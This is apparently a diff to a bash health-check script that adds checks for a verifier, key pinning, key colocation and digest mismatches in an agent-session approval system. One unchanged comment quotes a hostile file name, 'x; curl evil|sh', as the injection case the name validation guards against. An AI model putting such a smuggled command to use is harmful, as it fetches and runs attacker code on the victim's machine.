@@ -203,7 +203,7 @@ CCRC_DOCTOR_CHECKS=(
   pools
   pool-sync
   transcripts
-  update-sync server-caps   # one line, as `flock timeout`: _check_server-caps is APPENDED near the end of this file, just before _check_oom-policy
+  update-sync server-caps approval-verifier-runnable approval-key approval-key-colocated approval-digest-mismatch   # one line, as `flock timeout`: _check_server-caps is APPENDED near the end of this file, just before _check_oom-policy; the four approval checks are at the very END
   graphify
   graphify-path
   build
@@ -3764,8 +3764,8 @@ _check_pools() {
     # this check's whole value is that what it prints can be trusted, and a
     # tag file named `x; curl evil|sh` rendered `remedy: clear each: ccd
     # project-pool --project x; curl evil|sh --clear`. The charset is
-    # `_ws_project_valid`'s own (`ccd:3685`, `^[A-Za-z0-9._-]+$`, no
-    # dot-leading), so no name `ccd` would ever CREATE is omitted — a
+    # `_ws_project_valid`'s own (grep `_ws_project_valid`, `^[A-Za-z0-9._-]+$`,
+    # no dot- or dash-leading), so no name `ccd` would ever CREATE is omitted — a
     # cross-file claim, and `pool-name-parity.test.ts` measures it rather than
     # trusting this sentence. A leading `-` is refused too: it is shell-safe
     # but would be read by `ccd` as a flag, not as the project.
@@ -6560,11 +6560,11 @@ _dr_codex_usage_surplus_rows() {   # <_dr_codex_usage_surplus's rc> -> WARN find
 #
 # THE POPULATION is the roster's `exec.kind == "codex"` rows, read by the lane
 # library's ONE reader of that question (`_codex_lanes`, ccd/ccrc) — never
-# accounts.sh's telemetry-keyed CCRC_CODEX_BACKEND, which names the EXTERNAL
-# lanes another repository runs — plus any lane directory left under
-# `_codex_lane_dir` for an id the roster no longer calls codex: a flip back to
-# another launcher keeps that state on purpose, and it is WARNed, never
-# silently skipped (D-3713).
+# accounts.sh's telemetry-keyed CCRC_CODEX_BACKEND, which names any
+# EXTERNAL lane reporting codex usage (another repository's did; retired by
+# Plan 4) — plus any lane directory left under `_codex_lane_dir` for an id
+# the roster no longer calls codex: a flip back to another launcher keeps
+# that state on purpose, and it is WARNed, never silently skipped (D-3713).
 #   - role `server`: SKIP, a server box converges nothing per account
 #     (D-3111). CCRC_ROLE unset or unreadable reads as NOT server, as
 #     `cmd_update` reads it.
@@ -9343,4 +9343,125 @@ _check_update-sweep() {
       _dr_skip update-sweep "the last report's sweep word is not one this build knows ('$sw'), so it was not read"
       return 3 ;;
   esac
+}
+
+# ── the approval wait's two checks (coordinator-first routing, plan Task 14, spec §6.3 step 1 and §6.4, D-5297, D-5487) ──
+# A dispatched child's permission hook asks the server for a ruling only when it can VERIFY one: `node` on PATH, the
+# verifier installed beside the hook, and the server's public key pinned. `approval-verifier-runnable` names each
+# missing piece by name; any one missing means rulings never engage on this box (every prompt goes to the operator,
+# as before), which is a WARN and not a FAIL: nothing is broken that worked. A server-role box hosts no sessions.
+_dr_approval_role() {
+  local r=""
+  [ -f "${BOX_ENV_FILE:-}" ] && [ -r "${BOX_ENV_FILE:-}" ] && r="$(_box_env_value "$BOX_ENV_FILE" CCRC_ROLE)"
+  printf '%s' "$r"
+}
+_check_approval-verifier-runnable() {
+  local missing=""
+  if [ "$(_dr_approval_role)" = server ]; then
+    _dr_skip approval-verifier-runnable "this box records CCRC_ROLE=server, so it hosts no sessions and no permission hook runs on it"
+    return 3
+  fi
+  # No registry, no sessions: `ccd` creates `~/.cc-sessions` before it starts one, so a box without it has no child
+  # whose hook could wait.
+  if [ ! -d "$HOME/.cc-sessions" ]; then
+    _dr_skip approval-verifier-runnable "this box has no session registry (\$HOME/.cc-sessions), so no child's permission hook runs on it"
+    return 3
+  fi
+  # `node` is looked up on doctor's own PATH. A session runs under claude-session@'s environment, whose PATH holds the
+  # same install's bin directories, so a box where doctor finds node is one where the hook finds it; a hand-edited unit
+  # PATH is the case this cannot see (D-5487).
+  command -v node >/dev/null 2>&1 || missing="${missing:+$missing, }node (not on PATH)"
+  # The registry as the bare directory, never `.cc-sessions/<name>` on a code line: pool-name-parity.test.ts pins those.
+  local areg="$HOME/.cc-sessions"
+  [ -f "$areg/approval-verify.mjs" ] || missing="${missing:+$missing, }the verifier (approval-verify.mjs in \$HOME/.cc-sessions)"
+  # A key not pinned yet, with node and the verifier in place, is the rollout's expected state (D-5487 (1)): the server
+  # had not served one when this box last updated. Nothing is broken, so it SKIPs and a fresh install ends green (D-139).
+  if [ -z "$missing" ] && [ ! -f "$HOME/.ccrc/approval-signing.pub" ]; then
+    _dr_skip approval-verifier-runnable "no approval key is pinned yet (\$HOME/.ccrc/approval-signing.pub): the server had not served one when this box last updated, so every prompt goes to the operator, as today; the next ccrc update after the server serves one pins it"
+    return 3
+  fi
+  [ -f "$HOME/.ccrc/approval-signing.pub" ] || missing="${missing:+$missing, }the pinned key (\$HOME/.ccrc/approval-signing.pub)"
+  if [ -n "$missing" ]; then
+    _dr_warn approval-verifier-runnable "a child's permission hook cannot verify a ruling, so coordinator rulings never engage on this box and every prompt goes to the operator; missing: $missing" \
+      "run ccrc update (it installs the verifier and pins the server's key once the server serves one); install Node if the 'node' check names it"
+    return 2
+  fi
+  _dr_pass approval-verifier-runnable "node, the verifier and the pinned approval key are present"
+}
+# `approval-key-changed`: the install spine pins the server's key ONCE and never replaces it; a later run offered a
+# different key records the offer in `~/.ccrc/approval-key-offered`. That is a FAIL until the operator decides.
+_check_approval-key() {
+  local pinned="$HOME/.ccrc/approval-signing.pub" offered="$HOME/.ccrc/approval-key-offered"
+  if [ "$(_dr_approval_role)" = server ]; then
+    _dr_skip approval-key "this box records CCRC_ROLE=server; the key it serves is pinned on the fleet box"
+    return 3
+  fi
+  if [ ! -f "$pinned" ]; then
+    _dr_skip approval-key "no approval key is pinned yet (\$HOME/.ccrc/approval-signing.pub); the 'approval-verifier-runnable' check owns that"
+    return 3
+  fi
+  if [ -f "$offered" ] && [ "$(cat -- "$offered" 2>/dev/null)" != "$(cat -- "$pinned" 2>/dev/null)" ]; then
+    _dr_fail approval-key "approval-key-changed: the server offered a different approval key than the one pinned in \$HOME/.ccrc/approval-signing.pub; the pinned key stays, so rulings signed by the new key are ignored" \
+      "if the server's key was rotated on purpose, remove \$HOME/.ccrc/approval-signing.pub and \$HOME/.ccrc/approval-key-offered by hand and run ccrc update; otherwise find out why the server's key changed"
+    return 1
+  fi
+  _dr_pass approval-key "the pinned approval key is the one the server last offered"
+}
+# ── the approval rulings' two server-side checks (coordinator-first routing, plan Task 16, spec §6.1, §6.3, D-5298) ──
+# `approval-key-colocated`: the server's PRIVATE signing key sits on a box that also runs agent-lane sessions, so a
+# same-user child could read it and a signature no longer shows the server made a ruling (spec §6.1). Reported whether
+# or not the operator placed `~/.ccrc/approvals-single-box`: the opt-in decides whether rulings are minted, not whether
+# the key is reachable. A WARN, because the single-box install is documented and the opt-in is the operator's.
+_check_approval-key-colocated() {
+  local key="$HOME/.ccrc/approval-signing.key" n=0 f
+  if [ ! -f "$key" ]; then
+    _dr_skip approval-key-colocated "this box holds no approval signing key (\$HOME/.ccrc/approval-signing.key); only a server that has started with coordination writes one"
+    return 3
+  fi
+  if [ -d "$HOME/.cc-sessions" ]; then
+    for f in "$HOME/.cc-sessions"/*.uuid; do [ -e "$f" ] && n=$((n + 1)); done
+  fi
+  if [ "$n" -gt 0 ]; then
+    # The server's own gate (`rulingsAllowedHere`): a non-`both` role over CCRC_FLEET=remote mints without the opt-in;
+    # `both`, or a local fleet mode whatever the recorded role, only with it.
+    local opt="the operator has not opted in, so this server mints no rulings (409 single-box)" role="" mode=""
+    if [ -f "${BOX_ENV_FILE:-}" ] && [ -r "${BOX_ENV_FILE:-}" ]; then
+      role="$(_box_env_value "$BOX_ENV_FILE" CCRC_ROLE)"; mode="$(_box_env_value "$BOX_ENV_FILE" CCRC_FLEET)"
+    fi
+    if [ "$mode" = remote ] && [ "$role" != both ]; then
+      opt="this box records CCRC_ROLE=${role:-(none: server, derived)} and CCRC_FLEET=remote, so this server mints and signs rulings here without the opt-in"
+    elif [ -f "$HOME/.ccrc/approvals-single-box" ]; then
+      opt="the operator opted in (\$HOME/.ccrc/approvals-single-box), so rulings are minted and signed here"
+    fi
+    _dr_warn approval-key-colocated "approval-key-colocated: the server's approval signing key sits beside $n session row(s) on this box, so a same-user session could read it; $opt" \
+      "run the server and the sessions on two boxes (ccrc install --role server / --role fleet) for a signature that separates them; on one box, keep \$HOME/.ccrc/approvals-single-box only if you accept that"
+    return 2
+  fi
+  _dr_pass approval-key-colocated "the approval signing key sits on a box with no session rows"
+}
+# `approval-digest-mismatch`: the server refuses a request whose digest it cannot recompute, or whose canonical string
+# does not re-canonicalise to itself (`409 digest-mismatch`), and journals each one in `~/.ccrc/approval-refusals.log`
+# (`<epoch ms> digest-mismatch <session id>`, D-5490). Any in the last seven days means the hook's jq form and the
+# server's TypeScript form disagree on some input: a WARN, with the count, so a divergence is never silent.
+_check_approval-digest-mismatch() {
+  local log="$HOME/.ccrc/approval-refusals.log" since n=0 at word rest
+  if [ "$(_dr_approval_role)" = fleet ]; then
+    _dr_skip approval-digest-mismatch "this box records CCRC_ROLE=fleet; the server box journals the approval refusals"
+    return 3
+  fi
+  if [ ! -f "$log" ]; then
+    _dr_pass approval-digest-mismatch "no approval request has been refused digest-mismatch on this server"
+    return 0
+  fi
+  since=$(( ($(date +%s) - 7 * 86400) * 1000 ))
+  while read -r at word rest; do
+    [[ "$at" =~ ^[0-9]+$ && "$word" == digest-mismatch ]] || continue
+    (( at >= since )) && n=$((n + 1))
+  done < "$log"
+  if [ "$n" -gt 0 ]; then
+    _dr_warn approval-digest-mismatch "approval-digest-mismatch: $n approval request(s) refused digest-mismatch in the last 7 days; the hook's canonical form and the server's disagree on some input, and those prompts went to the operator" \
+      "compare the hook's APPROVAL_DIGEST_JQ with approvalDigestBytes over the corpus (server/test/fixtures/approvals/digest-corpus.json) and check that the fleet box and the server run the same release"
+    return 2
+  fi
+  _dr_pass approval-digest-mismatch "no approval request was refused digest-mismatch in the last 7 days"
 }
